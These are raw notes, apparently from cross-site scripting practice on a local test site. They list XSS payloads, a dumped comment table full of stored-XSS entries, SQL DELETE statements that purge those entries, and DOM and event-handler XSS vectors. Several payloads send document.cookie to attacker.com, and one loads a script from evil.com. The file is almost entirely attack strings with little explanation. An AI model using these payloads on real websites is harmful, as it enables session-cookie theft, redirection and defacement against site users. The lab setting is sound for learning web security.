 Payload : 
- <script>alert('Hacked!')</script>
- <script>new Image().src="http://attacker.com/log.php?c="+document.cookie;</script>
- <script>document.body.innerHTML='<h1>Hacked by XSS</h1>';</script>
- DELETE FROM comment 
WHERE content LIKE '%Hacked by XSS%';
- <script>window.location.href = "http://attacker.com/malicious-page";</script>
- <script>window.location.href = "http://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie);</script>
id	content
1	1233
2	e224
3	53535
4	<script>alert('Stored XSS')</script>
5	<script src="http://evil.com/malicious.js"></script>
6	<script>new Image().src='http://attacker.com/log?cookie='+document.cookie;</script>
7	123443545
8	<script>alert('B?n dã b? hack!');</script>
9	<script>alert('Stored XSS')</script>
10	53535
11	78678857
13	hello
14	12345
15	while(true) { alert('Trang web b? hack!'); }
16	window.location.href = "http://attacker.com/malicious-page";
18	<script>   fetch("http://attacker.com/steal.php?cookie=" + document.cookie); </script>
19	<script>fetch("http://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie), {     method: "GET",     mode: "no-cors" });</script>
20	<script>window.location.href = "http://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie);</script>
 DELETE FROM comment
WHERE content LIKE '<script src="http://evil.com/malicious.js"></script>';
  DELETE FROM comment
WHERE content LIKE '%<script>%'
   OR content LIKE '%window.location%'
   OR content LIKE '%fetch(%'
   OR content LIKE '%document.cookie%';
<img src=x onerror=alert(1)>
<img src=1 href=1 onerror="javascript:alert('XSS')">
<svg onload=alert(1)>
- <svg><script>alert(1)</script></svg>
<a href="javascript:alert(1)">Click me</a>
<input onfocus=alert(1) autofocus> --- > document.querySelectorAll('input[onfocus]').forEach(el => el.remove()); -- để xóa autofocus 
<iframe src="javascript:document.write('<script>alert(1)</script>');">
<img src=x onerror=confirm(1)>
<svg onload=prompt(1)> 
/dom-xss 
http://localhost:8080/dom-xss?name=<img src=x onerror=alert(1)>
"><script>alert(1)</script>
"><iframe%20src="javascript:alert(1)"></iframe>
"><span onmouseover="setTimeout('alert(1)',0)">Hover me!</span>
"><svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
"><img src=x onerror=confirm(document.domain)>
<span onmouseover="setTimeout('alert(1)', 0)">Hover me!</span>